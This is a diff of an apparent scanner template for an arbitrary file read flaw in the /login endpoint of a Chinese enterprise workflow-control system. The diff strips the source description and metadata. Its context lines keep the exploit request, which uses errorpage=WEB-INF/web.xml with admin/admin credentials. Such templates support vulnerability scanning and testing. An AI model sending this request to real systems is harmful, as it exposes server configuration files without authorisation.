@@ -3,12 +3,8 @@ info:
   name: 时空智友企业流程化管控系统login任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lrd4lifgrkm0bpg0'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lrd4lifgrkm0bpg0
-    fofa: 暂无
 http:
 - raw:
   - 'POST /login HTTP/1.1
@@ -39,8 +35,6 @@ http:
 
 
     Connection: close
-
-
 
 
     op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin
